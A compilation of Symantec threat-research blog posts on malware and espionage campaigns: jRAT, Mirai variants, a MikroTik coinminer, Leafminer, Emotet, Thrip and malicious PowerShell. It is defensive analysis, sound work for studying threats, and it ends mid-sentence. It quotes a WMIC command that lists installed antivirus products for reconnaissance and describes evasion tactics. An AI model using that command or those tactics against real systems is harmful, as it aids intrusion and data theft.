    "text": "We recently observed malware authors using a combination of a tool found on all Windows computers and a usually innocuous file type associated with modifying and rendering XML documents. While these two things—the Windows Management Instrumentation Command-line (WMIC) utility and an eXtensible Stylesheet Language (XSL) file—would not normally raise suspicion if found on a computer, in this case they’re used as part of a multistage infection chain that delivers a modular information-stealing threat. The use of WMI by cyber criminals is not new, however, the tool is typically used for propagation but in this case is used to download a malicious file. The use of WMIC is beneficial for the attackers as it helps them to remain inconspicuous and also provides them with a powerful tool to aid them in their activities. The WMIC utility provides a command-line interface for WMI, which is used for an array of administrative capabilities for local and remote systems and can be used to query system settings, stop processes, and locally or remotely execute scripts. Parallels can be drawn between WMIC and PowerShell, another legitimate tool which is also found on Windows systems and is increasingly being abused by cyber criminals. PowerShell’s popularity among cyber criminals was highlighted when Symantec saw a661 percent increase in malicious PowerShell activityfrom H2 2017 to H1 2018. The use of WMIC here, as well as a host of additional legitimate dual-use tools used in this attack, adds to the continuing evidence of cyber criminals using so-called “living off the land” tactics in order to reduce the chances of their activity being detected. Thankfully Symantec has multiple technologies in place to protect customers from these types of attacks and the tactics used in this particular case were successfully blocked by our file-, behavior-, and network-based protection including Symantec’s advanced machine learning technology. Malware authors are continuously trying to fly under the radar of security products. Their attack techniques are evolving, and they are constantly coming up with new ways to introduce their malware onto computers. For instance, they may drop an encrypted payload and decrypt it in memory to try and bypass security detections. Or instead of directly downloading and executing the payload, they may make use of non-PE files to drop their malware. They may also try to exploit Microsoft tools to download payloads, as we’ve observed in this case. As previously mentioned, as part of our ongoing work to protect customers from these types of attacks we spotted an attack chain that incorporates many layers of obscurity. Email password stealer- The malware uses the MailPassview utility to capture email account passwords. Web browser password stealer- The malware uses WebBrowser Passview to steal passwords stored in web browsers. Keylogger- The malware uses the global keyboard hook WindowsKeyboardhook to capture keystrokes and writes all keystrokes into a file in an encrypted form. It also logs the contents of the clipboard and active window titles. The keylogger requires the keyboard layout to be set to Japanese in order to capture keystrokes. It checks for keyboard layout type value 0x7 (Japanese keyboard). If the value doesn’t match it will not capture keystrokes. The keylogger cannot connect to the command and control (C&C) servers by itself – the network module is required to transfer the stolen information to the attackers’ servers. Network/phishing- The malware uses the phishing module and uses http://renivaxx01.gettrails[DOT]com/01/ for phishing. The remaining three modules—File browser, Backdoor, Coinminer—are unremarkable and their functionality is just as their names suggest.

As it is, the IoT market is hugely fragmented and most of the devices do not receive software patches for the known vulnerabilities. To make things worse, the malware authors continue to evolve these variants, making the malware more powerful and portable across different platforms and architectures. One of the major pain points for a cross-platform IoT botnet is portability. The malware must be able to run on different architectures and platforms in a self-contained capsule without any runtime surprises or misconfiguration. This is also an area where many inexperienced malware authors, or script-kiddies, fail if they simply copy/paste and reuse the existing malware code base. At the end of July, I came across a live remote server hosting multiple malware variants, each for a specific platform. As with many Mirai infections, it starts by firing a shell script on a vulnerable device. That shell script sequentially tries downloading and executing individual executables one by one until a binary compliant with the current architecture is found. The successfully executed executable file is responsible for the actual Mirai payload, such as enumerating a list of IP addresses by creating a list of random addresses and scanning for devices with default credentials, or vulnerabilities. While this is similar behavior to the Mirai variants we’ve seen so far, what makes it interesting is the compiled binary. These variants have been created by leveraging an open-source project calledAboriginal Linuxthat makes the process of cross-compilation easy, effective, and practically fail-proof. It should be noted that there is nothing malicious or wrong with this open-source project, the malware authors are once again leveraging legitimate tools to supplement their creations, this time with an effective cross compilation solution. Given that the existing code base is combined with an elegant cross-compilation framework, the resultant malware variants are more robust and compatible with multiple architectures and devices, making it executable on a wide variety of devices ranging from routers, IP cameras, connected devices, and even Android devices. For example, Figure 2 shows an ARM7 malware variant running on an Android device running Android 4.4, and Figure 3 shows the sample running on Debian ARM. The remainder of the malware’s functionalities are consistent with known Mirai behavior. For example, when I executed the sample in a contained environment, it attempted to scan more than 500,000 IP addresses generated through the random generation process previously described, and then tried to send raw packet data over port 23.

    "text": "We have recently observed a newer version of the cross-platform jRAT (Trojan. Maljava) remote access Trojan (RAT) in the wild. This version uses new techniques to evade parsing and detection, as well as to prevent itself from being reverse-engineered, by prepending corrupt MZ files before the malicious JAR file. We first spotted this version of jRAT in early November 2017. In April 2018, we noticed its number increased more than 300 percent to 1,071 from 333 in March. There could be two reasons why we have not seen huge hits for this version: 1) It wants to remain stealthy and difficult to detect, and used only for targeted attacks; and 2) It may not be widely adopted yet among attackers. While the volumes of these attacks are on the lower side, this jRAT has shown that it is quite capable and can go undetected with minimum presence and anti-parsing methods. The malware mainly targets the financial sector, but we’ve also seen infections in the service, communications, hospitality, government, and energy sectors. The malware mainly targets the financial sector, but we’ve also seen infections in the service, communications, hospitality, governments, and energy sectors. The infection chain begins with spam emails, which are specially crafted using social engineering techniques to entice victims into opening the attachment. We’ve seen several themes for emails distributing this version of jRAT, including: The emails contain a JAR file attachment. This file comes with a surprise MZ header, as well as two corrupt MZ files prepended before the JAR file. This thwarts not only MZ parsers, but Java parsers as well. These files do not contain \\x00 bytes, which indicates the intent. The MZ files cannot be parsed due to a broken PE structure; the files appear to be full MZ but apparently are used only for evading parsers. This may be considered a defense layer to protect the JAR file from being reverse-engineered. Surprisingly, Java is still able to load and execute this JAR file as weaker zip parsing implementations rely on end of central directory record and parses the content to locate and execute main class. This file can be recognized as jRAT by looking at the class names. The wrapper JAR file drops a secondary JAR file and copies it to a%Temp%location. The payload JAR file can be extracted using AES decryption. The first 16 bytes in the file “k”seen in Figure 4 contains the key and the file “e” is the encrypted Java payload. The JAR runs every time Windows starts, and starts executing and connecting to its command and control (C&C) server at84.[REMOVED].132.145. It uses a WMIC interface to identify antivirus products installed on the compromised computer and firewall details. wmic /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get /format:list The configuration file and key file are visible, but the former is AES-encrypted. The JAR file contains various classes for platform-specific implementations for capturing screenshots, playing audio, downloading and executing files, I/O to and from files, logging keystrokes, among others. This new version of jRAT has the following capabilities: With these capabilities, the malware can violate victims’ privacy and capture and exfiltrate confidential information from target organizations. It’s also potentially capable of running on the following platforms: FreeBSD, OpenBSD, OSX, Solaris, Linux, Windows, and Android.

    "text": "Cryptocurrency coinminers are the new ransomware and malicious actors have already pounced on the opportunity to make their fortune. Symantec has beentrackinga large-scale coin-mining campaign which, as per Shodan, has currently infected about 157,000 MikroTik routers. Researchers discovered this coin-mining campaign in early August 2018. The campaign was initially concentrated in Brazil; however, it soon began infecting routers around the world. I decided to take a closer look at one of these infected routers to get a better understanding at what’s going on. At the outset, the compromised router has multiple services running on it. Interestingly, the infected router had the default web service disabled. Pointing a browser to the infected router’s port 80, causes it to serve the Coinhive script responsible for coin mining (Figure 2). But when the infected router is found in between a client sending a request and a server receiving it, this HTML page is only served when there’s an error. This is because internally the router is configured with a firewall rule that helps serve this malicious HTML page. Using network address translation (NAT), the firewall rule takes traffic bound to port 80and redirects it to port 8080 (Figure 3). The router is also configured to run a default proxy server on port 8080that’s responsible for serving the Coinhive script. Looking at the webproxypath,we can find the actual file (error.html)that holds the coin-mining script that’s served every time there’s an error. The error.html file is available from the following path: /webproxy/error.html When the router is compromised, the hackers schedule multiple scripts to run at various times. These scheduled scripts are created to download the error.htmlpage onto the router, which allows the hackers to drop various versions of the error.html page if they wish. These scheduled jobs are set up by another script which is executed on the compromised router during the initial stages of infection. This script is hosted on the min01.com/01/a113.rsc server, as seen in Figure 6. This script is responsible for performing multiple malicious actions on the router including, but not limited to: It’s likely that this script was downloaded using the inbuilt/tool fetchcommand and run using the/importcommand. All of the infected MikroTik routers (v6.29 to v6.42) that I encountered were running the Winboxservice, which is known to be vulnerable toCVE-2018-14847. When exploited successfully, this flaw can allow an attacker to bypass authentication and compromise the router. After the router is compromised, the hackers can load their malicious error page, which is displayed any time a user accessing the internet via the router encounters an HTTP error. Every time the error page is displayed, the victim is unknowingly mining Monero (XMR) for the hackers. These routers are used by many organizations and businesses, including internet service providers. While MikroTik was prompt in patching CVE-2018-14847, unfortunately poor patching practices by vendors and users mean that there are plenty of vulnerable routers still out there. The following Symantec intrusion prevention system (IPS) detections blocked this coin-mining campaign from day one: Figure 7 shows Symantec IPS detections protecting users from this coin-mining campaign. MikroTik has already published a patch to address CVE-2018-14847. Symantec recommends users to install the patch on their routers, if they have not done so already. Users can also consider disabling the following services on their routers, if not required: Karthikeyan is a member of Symantec’s Security Technology and Response team which is focused on providing round-the-clock protection against current and future cyber threats.

    "text": "Symantec has uncovered the operations of a threat actor named Leafminer that is targeting a broad list of government organizations and business verticals in various regions in the Middle East since at least early 2017. The group tends to adapt publicly available techniques and tools for their attacks and experiments with published proof-of-concept exploits. Leafminer attempts to infiltrate target networks through various means of intrusion: watering hole websites, vulnerability scans of network services on the internet, and brute-force/dictionary login attempts. The actor’s post-compromise toolkit suggests that the group is looking for email data, files, and database servers on compromised target systems. During our investigation, there was a breakthrough discovery that helped connect Leafminer to a number of attacks observed on systems in the Middle East and identify the toolkit used in the group’s efforts of intrusion, lateral movement, and exfiltration. The download URL for a malware payload used in one of the attacks lead to the identification of a compromised web server on the domain e-qht.az that had been used to distribute Leafminer’s arsenal of malware, payloads, and tools within the group and make them available for download from victim machines. As of early June 2018, the server hosted 112 files in a subdirectory that could be accessed through a public web shell planted by the attackers. In addition to malware and tools, the served files also included uploads of log files seemingly originating from vulnerability scans and post-compromise tools. The web shell is a modification of the PhpSpy backdoor and references the author MagicCoder while linking to the (deleted) domain magiccoder.ir. Researching the hacker handle MagicCoder results in references to the Iranian hacking forum Ashiyane as well as defacements by the Iranian hacker group Sun Army. During the investigation of the Leafminer group, we were able to assemble a targeting profile from different sources including telemetry and log files hosted publicly on the attacker’s arsenal server. One interesting source of target information discovered during the Leafminer investigation was a list of 809 targets used by the attackers for vulnerability scans. Symantec detection telemetry shows malware and custom tools used by Leafminer on 44 systems across four regions in the Middle East. One interesting source of target information discovered during the Leafminer investigation was a list of 809 targets used by the attackers for vulnerability scans. The list is written in the Iranian language Farsi and groups each entry with organization of interest by geography and industry. Figure 3 shows a breakdown of the industry verticals. Targeted regions included in the list are Saudi Arabia, United Arab Emirates, Qatar, Kuwait, Bahrain, Egypt, Israel, and Afghanistan. We observed three main techniques used by Leafminer for initial intrusion of target networks: There are indicators that suggest the attackers have also employed email phishing with malicious attachment files. However, this was not directly observed or captured. Our investigation of Leafminer started with the discovery of JavaScript code on several compromised websites in the Middle East. The obfuscated code was planted by the attackers to steal SMB credential hashes that could subsequently be brute-forced offline. When executing the code, the browser creates an invisible image tag and sets the URL to an attack server using the file:// protocol scheme. On Windows machines, this triggers a request to a remote server via the Samba networking protocol (SMB) that also transmits the user’s login NTLM hash. These hashes can be cracked to retrieve the original login password by methods of brute-force, dictionary, or rainbow table lookups. Table 1 shows an overview of the compromised websites used as watering holes, infected JavaScript URLs, and SMB URLs used to collect NTLM hashes. Interestingly, the same technique was also observed in watering hole attacks by the threat actorDragonfly in 2017 as reported by Symantec. As previously mentioned, Leafminer seems to be actively following developments and publications of the offensive security community when selecting their toolkit. This became especially apparent when analyzing the group’s techniques and tools for vulnerability scans and exploitation. The compromised web server used to store Leafminer’s arsenal hosted several public proof-of-concept exploits and exploitation tools. This included the Fuzzbunch framework that was part of an infamous leak of exploits and tools by the Shadow Brokers in April 2017. Leafminer has developed exploit payloads for this framework (Table 2) that deliver custom malware through attacks against SMB vulnerabilitiesdescribed by Microsoft. The EternalBlue exploit from the framework received worldwide attention after being used in the ransomware campaignsWannaCryin May andPetya/NotPetyain June 2017. The Leafminer operators use EternalBlue to attempt lateral movement within target networks from compromised staging servers. Symantec also observed attempts by Leafminer to scan for theHeartbleedvulnerability (CVE-2014-0160) from an attacker-controlled IP address. Furthermore, the Leafminer arsenal server hosted a Python script to scan for this vulnerability. Another intrusion approach used by Leafminer seems a lot less sophisticated than the previously described methods but can be just as effective: using specific hacktools to guess the login passwords for services exposed by a targeted system. This type of attack was observed both via dedicated servers set up by Leafminer as well as staging servers compromised by the group. Commands found in a readme text that was stored in a ZIP archive together with the hacktool THC Hydra in Leafminer’s tool arsenal represent online dictionary attacks on Microsoft Exchange and Remote Desktop Protocol services of regional government servers in Saudi Arabia. \"Online\" in this case refers to the attacker using the protocol of the targeted network service to quickly run through many password guesses. Symantec identified two strains of custom malware used by the Leafminer group:Trojan. ImecabandBackdoor. Sorgu. Directly connected to this malware are several sets of reflective loader DLLs used as droppers or to execute specific commands on a compromised system. The development of custom malware by Leafminer as well as some of the tools used for lateral movement show a preference for the . NET framework. We also observed that the attackers would download and install the . NET framework on compromised machines, supposedly in the situation that an operator would have remote access to the system but required . NET to run Leafminer's custom tools. To this end, the command and control (C&C) server operated by the group hosted the legitimate setup executable for Microsoft . NET Framework 2.0 SP2. Backdoor. Sorgu is used by the attackers to provide remote access to the infected machine. The backdoor is installed as a service in the Windows system through a shell command script. The purpose of Trojan. Imecab is to set up a persistent remote access account on the target machine with a hardcoded password. Variants of the malware were also observed with the filename guester.exe which likely refers to the functionality of adding a powerful guest account to the system. The malware installs itself in the system as a Windows service to achieve persistence and ensure that the guest account remains available to the attacker. Table 2 gives an overview of the reflective loader DLLs and their purpose: These DLLs were likely used as payloads for exploit shellcode of the Fuzzbunch framework, which is also evidenced by the embedded PDB strings. The discovery of malware and hacktools hosted on e-qht.az allowed us to correlate detection telemetry of potential Leafminer intrusions with tools made available for download to the group’s operators. Understanding the purpose of the tools used by the attacker gives a unique insight into the tactics and procedures used by Leafminer after the initial compromise of a target network. Table 3 outlines the observed toolset for lateral movement, information gathering, and exfiltration. We discovered a number of servers compromised by Leafminer that were used as staging systems to gain a foothold in the targeted network and execute attacks on intranet resources. For example, the use of THC Hydra to execute dictionary attacks against Exchange logins was observed both in initial intrusion attempts as well as in lateral attacks from staging systems. Figure 4 shows a screenshot of the Total SMB BruteForcer hacktool used by Leafminer for lateral movement. The tool requires input files with lists of IPs, users, and passwords respectively. The arsenal server hosted five text files that could be used by Leafminer operators as input for dictionary attacks using Total SMB Bruteforcer and THC Hydra. One of the custom tools used by the Leafminer group is a rebranded version of the widespread post-exploitation tool Mimikatz. While the logo and commands are identical to the original hacktool, the name was changed to OrangeTeghal. To evade security software while deploying this tool on compromised systems, the attackers use a technique revealed at Black Hat EU ‘17 in the presentationLost in Transaction: Process Doppelgänging. The malware file orange64.exe is a . NET executable that drops and executes a PowerShell script with basic obfuscation. After deobfuscation, this script closely resembles the code published by the authors of the technique. Process Doppelgänging uses NTFS transactions to modify the executable of a seemingly benign process that is suspended right after creation. Leafminer is a highly active group, responsible for targeting a range of organizations across the Middle East. The group appears to be based in Iran and seems to be eager to learn from and capitalize on tools and techniques used by more advanced threat actors. On a broad level, it has followed the recent trend among targeted attack groups for “living off the land”—using a mixture of publicly available tools alongside its own custom malware. More specifically, it mimicked Dragonfly’s use of a watering hole to harvest network credentials. It also capitalized on the Shadow Brokers release ofInception Frameworktools, making use of the leaked Fuzzbunch framework by developing its own exploit payloads for it. Leafminer’s eagerness to learn from others suggests some inexperience on the part of the attackers, a conclusion that’s supported by the group’s poor operational security. Leafminer has also been tracking developments in the world of cyber security. After the Heartbleed bug was disclosed it began scanning for instances of the vulnerability. It also utilized Process Doppelgänging, a detection evasion technique first discussed at the Black Hat EU conference last year. However, Leafminer’s eagerness to learn from others suggests some inexperience on the part of the attackers, a conclusion that’s supported by the group’s poor operational security. It made a major blunder in leaving a staging server publicly accessible, exposing the group’s entire arsenal of tools. That one misstep provided us with a valuable trove of intelligence to help us better defend our customers against further Leafminer attacks. Symantec has the following protections in place to protect customers against Leafminer attacks: File-based protection Customers of the DeepSight IntelligenceManaged Adversary and Threat Intelligence(MATI) service have received intelligence that details the characteristics of the Leafminer cyber espionage group and methods of detecting and thwarting activities of this adversary.

    "text": "Mealybug is a cyber crime actor that has been active since at least 2014. It is identified by its use of its custom malware,Trojan. Emotet. It appears to have changed its business model in recent times, evolving from targeting banking customers in Europe to using its infrastructure to act as a global packing and delivery service for other threat actors. Because it can self-propagate, Emotet presents a particular challenge for organizations. Network worms have been experiencing a kind of renaissance, with notable examples like WannaCry (Ransom. Wannacry) and Petya/NotPetya (Ransom. Petya). Network spreading also means that victims can become infected without ever clicking on a malicious link or downloading a malicious attachment. Once on a computer, Emotet downloads and executes a spreader module that contains a password list that it uses to attempt to brute force access to other machines on the same network. Emotet’s method of self-propagation—brute forcing passwords—has additional potential to cause major headaches for organizations as it may result in multiple failed login attempts, which can lead to users becoming locked out of their network accounts. This has the knock-on effect of increased calls to IT helpdesks and general loss of productivity. This was a hallmark of the notorious Conficker (W32. Downadup) threat and, 10 years later, threats continue to cause similar problems. As well as brute forcing passwords, Emotet can also spread to additional computers using a spam module that it installs on infected victim machines. This module generates emails that use standard social engineering techniques and typically contain subject lines including words such as “Invoice”. Some subject lines include the name of the person whose email account has been compromised, to make it seem less like a spam email. The emails typically contain a malicious link or attachment which if launched will result in them becoming infected with Trojan. Emotet. Most recently, Mealybug appears to have expanded its operations to primarily become a distributor of threats for other attack groups. When Mealybug was first identified in 2014 it was using Emotet to spread banking Trojans, and was focused on targeting banking customers in Germany. At the time, Mealybug was using Trojan. Emotet as the loader portion ofW32. Cridex. B, a rewritten version of the Cridex banking Trojan. In 2015, Mealybug started targeting Swiss banking customers as well and evolved Emotet into more modular malware. The new version of Emotet had separate modules for its loader, banking data theft, email login theft, distributed denial of service (DDoS) attacks, and malicious spam. Mealybug has primarily been engaged in using Emotet for the delivery of banking Trojans, and in 2017 it was the first group to deliver the IcedID (Trojan. IcedID) banking Trojan. However, also in 2017, it was observed delivering theTrojan. TrickybotandRansom. UmbreCryptransomware. Mealybug has developed its capabilities over the years and now appears to offer an “end-to-end” service for delivery of threats. It delivers the threats, obfuscates them to reduce the chances of detection, and provides a spreader module that allows the threats to self-propagate. Emotet gets an initial foothold on a victim machine or network by sending an email containing either a malicious link that leads to a downloader document or that has a malicious document attached. Anti-analysis tactics have been present in Emotet since at least 2015 and, in 2018, Emotet’s payload consists of a packed file containing the main component and an anti-analysis module. The anti-analysis module performs multiple checks to ensure it is not being run on a malware research machine, then loads the main component. Either PowerShell or JavaScript is used to download the Trojan, which delivers a packed payload file to the victim machine. Once on a machine, the latest version of Emotet: It can then download any new payloads from the C&C server, and execute them. Emotet can download an updated version of itself, or any other threat. Existing versions of Emotet download modules from the C&C server that include: According to Symantec telemetry for the first half of 2018, its focus now is mainly on targets in the U. S. All information stolen by these modules is sent to the C&C server. Emotet also has a DDoS module that can add the infected machine to a botnet to carry out DDoS attacks. Emotet’s geographic targets have also increased significantly over the years. After a relatively quiet period since 2015, detections of Emotet surged in the second half of 2017, and in that year Mealybug’s targets included victims in Canada, China, the UK, and Mexico. However, according to Symantec telemetry for the first half of 2018, its focus now is mainly on targets in the U. S. Since February 2018, Emotet has been used to spreadW32. Qakbot, a family of banking Trojans known for behaving like network worms. Like Emotet, Qakbot can self-propagate. Qakbot attempts brute force access to spread across networks and also uses “living-off-the-land” tools to propagate. It uses PowerShell to download and run Mimikatz (Hacktool. Mimikatz), an open-source credential stealing tool that allows attackers to move rapidly across a network once they have established an initial foothold. The fact that both Emotet and Qakbot have self-spreading capabilities mean that once these threats get onto your network they can spread aggressively. The fact that both attempt brute force access to spread across networks also increases the risk of users being locked out of their devices. A spike in Qakbot detections in February 2018 indicates that “double-spreading” of the threat was taking place, meaning that Mealybug was using Emotet to spread Qakbot across networks, while Qakbot was simultaneously using its own self-spreading capabilities. The account lockout scenario is a very real danger, and a potential major headache for organizations. Symantec analysis shows that Emotet and Qakbot are packed with the same packer, but there are multiple factors that suggest Mealybug is only providing Emotet as a delivery service for the actors behind Qakbot, and is not controlling the Trojan. There does not appear to be any overlap between the C&C infrastructure of the two Trojans, and analysis also revealed differences in the code of their main components and in their anti-debugging techniques. Mealybug using two different spreading mechanisms is also surprising because, as mentioned above, both Trojans attempting to brute force passwords could trigger account lockouts and stop the Trojans from spreading. It is unlikely Mealybug would use the two different spreading techniques if it was controlling both Trojans. For these reasons we believe Emotet and Qakbot are controlled by two separate groups, and that Mealybug is offering Emotet as a delivery mechanism for other threats. Mealybug seems to have found its niche as a provider of delivery services for other threats. The main component of Trojan. Emotet functions as a loader, and can theoretically support any payload. While it is still primarily known for distributing banking Trojans, it can in theory spread any threat, and there have been reports of it distributing the Ransom. UmbreCrypt ransomware. Mealybug presumably makes its money by taking a cut of the profits made by the threat actors who use its services. From what we can see, Mealybug appears to be operating for more than one attack group at a time, so we have no evidence that it offers itself as an “exclusive” distributor. In November 2017, Mealybug was observed delivering the Trojan. Trickybot and W32. Qakbot threats simultaneously onto the same machine in a few instances, and in one case within a few minutes. Mealybug’s shift from distributing its own banking Trojan to a relatively small number of targets, to acting primarily as a global distributor of other groups’ threats is interesting, and backs up an observation we made inthe ISTRthat threat actors are evolving and refining their techniques and business model to maximize profits. In the ISTR we outlined how some threat actors appeared to be turning to coin mining as it became hugely profitable due to the rise in the value of cryptocurrencies. It appears Mealybug has decided that it can best maximize its returns through taking a role as distributor. It may be that Mealybug was finding it harder to make money exclusively from banking Trojans so it had to change its approach. The growth in popularity and use by banks of two-factor authentication (2FA) has made it more difficult to compromise accounts by stealing credentials, and awareness and protection has improved as online banking has matured. Mealybug activity presents a number of challenges for organizations, including: Symantec has had protection for Mealybug attacks since the initial identification of the group’s activities in 2014 and blocks such activities at every level of Mealybug’s attack chain. Macro downloader stage: Main module file stage: Main module loaded stage: C&C communication stage: Spam and stealer and spreader module stage: Emotet spreader infection stage: Targeted Attack Analytics Symantec’s newTargeted Attack Analytics (TAA), available inour ATP Productcan detect attacks where an executable spreads to multiple machines across a network via credential theft, brute forcing, or an exploit. TAA detects Emotet’s malicious activity due to patterns in its spreading behavior. In particular, TAA will detect when files are dropped by Emotet’s spreader module on multiple machines in an organization. Customers of the DeepSight IntelligenceManaged Adversary and Threat Intelligence(MATI) service have received multiple reports on Emotet. These reports detail methods of detecting and thwarting activities of the group that leverages this Trojan.

    "text": "The preinstalled and versatile Windows PowerShell has become one of the most popular choices in cyber criminals’ arsenals. We have observed an increase of 661 percent in computers where malicious PowerShell activity was blocked from the second half of 2017 to the first half of 2018—a clear indication that attackers are still growing the use of PowerShell in their attacks. Of course, it is not just a method seen with targeted attack groups, but also among common cyber criminals deploying financial Trojans or cryptocurrency miners. Especially for fileless attacks, where no file is written to disk, such PowerShell scripts have become very popular, as recently seen with theGhostMinerandBluwimpsworms that distribute coinminers directly in memory. The whole “living off the land” tactic, of which PowerShell is a part, is very popular these days. Dual-use tools such as WMI or PsExec, which are commonly seen during attacks, are another frequently observed aspect of this tactic. Attackers are constantly experimenting with scripts, learning, and sharing their experience among themselves. In addition, PowerShell frameworks such as PowerSploit or Empire have made it easy not only for penetration testers but also attackers to integrate malicious scripts into their toolset. We extensively discussed PowerShell threats in our December 2016white paper, and most of the analysis is still valid today. However, we wanted to see how much the malicious usage has changed since then. To get a better understanding of today’s landscape, we analyzed more than 115,000 randomly selected malicious PowerShell command lines that we saw in 2018. Many of them came from Microsoft Office documents or self-propagating worms. The first thing that caught our eye was that, even though there are many obfuscation tricks available for PowerShell and even automated tools that can obfuscate scripts for users, these are rarely used in the wild. Only four percent of the PowerShell command lines we analyzed tried to obfuscate themselves by using a mixture of lower- and uppercase letters. And even those that do are often auto-generated by some toolkit with a poor randomizer. The following are two examples that were embedded into Microsoft Office documents: Of course, the classical string rearranging with the “-f” function or string concatenation are also used in an attempt to fool simple pattern matching. In our test set, we saw it used by 3.2 percent of the samples: Isolated cases of other string manipulation or special characters like the tick do occur as well, but very rarely: Occasionally there are PowerShell scripts generated by frameworks such as Invoke-Obfuscation resulting in cryptic scripts which make use of ConvertTo-SecureString and SecureStringToGlobalAllocUnicode. Many attackers probably are not too concerned about obfuscation because they know that not everybody is monitoring PowerShell activity anyway. Even if the security personnel do, then a non-obfuscated command line might be more likely to slip unnoticed through the cracks. Too much obfuscation can be a red flag. Of course, another option for the attacker is to use a BASE64-encoded blob to hide their commands, resulting in an extra step of decoding required, before the payload can be seen. This is often done by all kinds of scripts, including benign ones. From all analyzed scripts, 5.7 percent used a BASE64-encoded string to hide their commands. With 80 percent of this subset of scripts, most simply used the built-in “-EncodedCommand” command line argument or a variation thereof to decode and run their commands. But some attackers used other commands to achieve the same results, as there are usually many ways to reach a goal with PowerShell: The most common command line parameters we observed are still “-NoP -NonI -W Hidden”. Although the arguments can be written in different ways, most attackers stick to the short version. Regardless of the typing, we see that they appear in about three out of four command lines. The ExecutionPolicy flag is not used that often, as it is not needed when only one command is executed by the script. From all analyzed scripts, 5.7 percent used a BASE64-encoded string to hide their commands. With 80 percent of this subset of scripts, most simply used the built-in “-EncodedCommand” command line argument or a variation thereof to decode and run their commands. Some attackers are quite upfront about their intentions. We regularly see attackers trying to download and invokeHacktool. Mimikatzor Meterpreter shell directly from open source code repositories without even trying to hide it, although they only make up less than half a percent. One of the main goals of most malicious PowerShell scripts is still to download and execute some remote payload. From all samples analyzed, 17 percent downloaded something through HTTP or HTTPS. The scripts are getting more robust and often try multiple URLs, use the local proxy settings, or set a specific user agent in order to succeed. However, the user agent is not always used to blend in by spoofing an installed browser or Office application. Some downloader threats use it to track different campaigns or prevent anyone from accidentally downloading the payload without the right password. For example, one very active PowerShell downloader often uses “USR-KL” or “USRUE-VNC” as user agent when downloading the next stage. But looking at other instances indicates that they do some granular tracking as well: “LL-Chrome”, “Linux-MK”, “CA_SKULL”, “US-SKULL”. They likely know that these strings are visible, and therefore sometimes have fun as well, e.g. “Rembo 20”, “TrumpOK 1.0.0”, “Breakthrough 1.0.0”. The number of computers where PowerShell commands were executed doubled from 734,262 in Q1 2018 to 1,451,449 in Q2 2018. In May 2018, we saw PowerShell scripts being executed on an average of 480,000 computers per day. Of course, not every invocation of PowerShell is malicious. As a matter of fact, the majority of cases are benign scripts and only 0.8 percent were malicious, but don’t let that fool you—the threat from malicious PowerShell is definitely increasing. The high number of PowerShell activity makes it obvious that you cannot just ban all PowerShell activity on a computer. At Symantec, we use the vast number of data to feed our various protection engines such as behavioral detection or advanced machine learning. With this telemetry data, we can then find previously unknown malicious scripts and stop them, without affecting the regular administration work on the system. The number of computers where PowerShell commands were executed doubled from 734,262 in Q1 2018 to 1,451,449 in Q2 2018. In May 2018, we saw PowerShell scripts being executed on an average of 480,000 computers per day. We see that PowerShell is still heavily used as part of the living off the land tactic for lateral movement, downloaders, and fileless threats. This trend is most likely to increase further in combination with dual-use tools. Most attackers don’t even try to hide their intention very much. Unfortunately, they often do not have to and are still successful since many system administrators do not monitor such activity. The attacker can hide in plain sight with all the benign PowerShell activity that occurs. One has to look carefully to spot the malicious activity with the naked eye. Now that Windows PowerShell officially has a built-in SSH client, we expect even more legitimate use of PowerShell on various systems and some malicious scripts misusing SSH too.

    "text": "One of the most significant developments in cyber espionage in recent years has been the number of groups adopting “living off the land” tactics. That’s our shorthand for the use of operating system features or legitimate network administration tools to compromise victims’ networks. The purpose of living off the land is twofold. By using such features and tools, attackers are hoping to blend in on the victim’s network and hide their activity in a sea of legitimate processes. Secondly, even if malicious activity involving these tools is detected, it can make it harder to attribute attacks. If everyone is using similar tools, it’s more difficult to distinguish one group from another. Most attack groups do still create and leverage custom malware, but it tends to be employed sparingly, reducing the risk of discovery. This doesn’t mean espionage attacks are now going undiscovered, but it does mean that they can take longer for analysts to investigate. This is one of the reasons why Symantec createdTargeted Attack Analytics (TAA), which takes tools and capabilities that we’ve developed for our own analysts and makes them available to our Advanced Threat Protection (ATP) customers. TAA leverages advanced artificial intelligence and machine learning that combs through Symantec’s data lake of telemetry in order to spot patterns associated with targeted attacks. Its advanced AI automates what previously would have taken thousands of hours of analyst time. This makes it far easier for us, and for our customers, to find that “needle in the haystack.” It was TAA that led us to the latest cyber espionage campaign we’ve uncovered. Back in January 2018, TAA triggered an alert at a large telecoms operator in Southeast Asia. An attacker was using PsExec to move laterally between computers on the company’s network. PsExec is a Microsoft Sysinternals tool for executing processes on other systems and is one of the most frequently seen legitimate pieces of software used by attackers attempting to live off the land. However, it’s also widely used for legitimate purposes, meaning malicious use of PsExec can be difficult to spot. TAA not only flagged this malicious use of PsExec, it also told us what the attackers were using it for. They were attempting to remotely install a previously unknown piece of malware (Infostealer. Catchamas) on computers within the victim’s network. Armed with this information about the malware and living off the land tactics being used by this group of attackers whom we named Thrip, we broadened our search to see if we could find similar patterns that indicated Thrip had been targeting other organizations. We uncovered a wide-ranging cyber espionage campaign involving powerful malware being used against targets that are a cause for concern. We identified three computers in China being used to launch the Thrip attacks. Thrip’s motive is likely espionage and its targets include those in the communications, geospatial imaging, and defense sectors, both in the United States and Southeast Asia. Perhaps the most worrying discovery we made was that Thrip had targeted a satellite communications operator. The attack group seemed to be particularly interested in the operational side of the company, looking for and infecting computers running software that monitors and controls satellites. This suggests to us that Thrip’s motives go beyond spying and may also include disruption. Another target was an organization involved in geospatial imaging and mapping. Again, Thrip seemed to be mainly interested in the operational side of the company. It targeted computers running MapXtreme Geographic Information System (GIS) software which is used for tasks such as developing custom geospatial applications or integrating location-based data into other applications. It also targeted machines running Google Earth Server and Garmin imaging software. The satellite operator wasn’t the only communications target Thrip was interested in. The group had also targeted three different telecoms operators, all based in Southeast Asia. In all cases, based on the nature of the computers infected by Thrip, it appeared that the telecoms companies themselves and not their customers were the targets of these attacks. In addition, there was a fourth target of interest, a defense contractor. Thrip uses a mixture of custom malware and living off the land tools to perform its attacks. The latter include: All of these tools, with the exception of Mimikatz (which is almost always used maliciously), have legitimate uses. For example, PowerShell is widely used within enterprises and the vast majority of scripts are legitimate. Similarly, PsExec is frequently used by systems administrators. However, in this case, it was Thrip’s use of PsExec that drew our attention. Through advanced artificial intelligence and machine learning, TAA has trained itself to spot patterns of malicious activity. While PsExec itself may be innocuous, the way that it was being used here triggered an alert by TAA. In short, Thrip’s attempts at camouflage blew its cover. While Thrip now makes heavy use of 